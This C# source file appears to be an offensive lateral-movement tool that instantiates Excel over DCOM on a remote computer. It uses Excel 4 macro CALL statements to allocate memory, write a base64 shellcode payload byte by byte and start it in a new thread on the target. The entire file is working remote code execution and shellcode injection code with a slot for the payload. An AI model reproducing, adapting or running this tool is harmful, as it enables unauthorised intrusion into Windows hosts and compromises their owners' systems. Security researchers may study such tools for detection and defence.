using System;
using System.Collections.Generic;
using System.Reflection;

namespace MoveDC
{
    class Program
    {
        static void ExecExcelDCOM(string computername, string arch)
        {
            try
            {
                Type ComType = Type.GetTypeFromProgID("Excel.Application", computername);
		object RemoteComObject = Activator.CreateInstance(ComType);
                int lpAddress;
                if (arch == "x64")
                {
                    lpAddress = 1342177280;
                }
                else
                {
                    lpAddress = 0;
                }
                string strfn = ("$$PAYLOAD$$");
                byte[] benign = Convert.FromBase64String(strfn);

                var memaddr = Convert.ToDouble(RemoteComObject.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { "CALL(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\"," + lpAddress + "," + benign.Length + ",4096,64)" }));
                int count = 0;
                foreach (var mybyte in benign)
                {
                    var charbyte = String.Format("CHAR({0})", mybyte);
                    var ret = RemoteComObject.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { "CALL(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",-1, " + (memaddr + count) + "," + charbyte + ", 1, 0)" });
                    count = count + 1;
                }
                RemoteComObject.GetType().InvokeMember("ExecuteExcel4Macro", BindingFlags.InvokeMethod, null, RemoteComObject, new object[] { "CALL(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",0, 0, " + memaddr + ", 0, 0, 0)" });
                Console.WriteLine("[+] Executing against      :   {0}", computername);
            }
            
            catch (Exception e)
            {
                Console.WriteLine("[-] Error: {0}", e.Message);
            }
            
        }

        static void Main(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (string argument in args)
            {
                int idx = argument.IndexOf('=');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
            }

            if(!arguments.ContainsKey("computername"))
            {
                Console.WriteLine("[-] Error: computername arg is required");
                return;
            }
            else
            {
                string arch = "x86";
                string target = arguments["computername"];
                if (arguments.ContainsKey("arch"))
                {
                    if(arguments["arch"].ToLower() == "x64" || arguments["arch"] == "64")
                    {
                        arch = "x64";
                    }
                }
                ExecExcelDCOM(target, arch);
            }
        }
    }
}